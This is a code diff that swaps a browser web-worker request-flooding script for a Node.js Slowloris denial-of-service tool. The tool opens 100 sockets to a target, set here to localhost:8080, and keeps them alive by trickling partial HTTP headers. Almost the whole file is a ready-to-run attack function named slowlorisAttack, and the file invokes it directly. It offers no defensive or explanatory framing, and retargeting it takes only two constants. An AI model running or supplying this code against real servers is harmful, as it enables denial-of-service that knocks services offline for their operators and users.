@@ -1,24 +1,47 @@
-// worker.js
+const net = require("net");
 
-self.onmessage = function (event) {
-  const { url, numberOfRequests } = event.data;
+const targetHost = "localhost";
+const targetPort = 8080;
+const numberOfConnections = 100;
+const intervalBetweenHeaders = 1000; // Interval in milliseconds
 
-  let requestsSent = 0;
+function slowlorisAttack() {
+  for (let i = 0; i < numberOfConnections; i++) {
+    const client = new net.Socket();
 
-  function sendRequest() {
-    fetch(url)
-      .then((response) => {
-        if (response.ok) {
-          requestsSent++;
-          self.postMessage(1); // Send a message back to the main script
+    client.connect(targetPort, targetHost, () => {
+      console.log("Connected to target server");
+
+      // Send initial HTTP request headers
+      client.write("GET / HTTP/1.1\r\n");
+      client.write(`Host: ${targetHost}\r\n`);
+
+      // Function to send headers periodically
+      const sendHeader = () => {
+        if (client.writable) {
+          client.write(`X-a: ${Math.random()}\r\n`);
+        } else {
+          clearInterval(interval);
         }
-      })
-      .catch((error) => {
-        console.error("Request failed:", error);
-      });
-  }
+      };
 
-  for (let i = 0; i < numberOfRequests; i++) {
-    setTimeout(sendRequest, i * 10); // Send a request every 10ms
+      // Set interval to send headers periodically
+      const interval = setInterval(sendHeader, intervalBetweenHeaders);
+
+      // Handle connection close event
+      client.on("close", () => {
+        console.log("Connection closed");
+        clearInterval(interval);
+      });
+
+      // Handle error event
+      client.on("error", (error) => {
+        console.error("Connection error:", error.message);
+        clearInterval(interval);
+      });
+    });
   }
-};
+}
+
+// Start the attack
+slowlorisAttack();
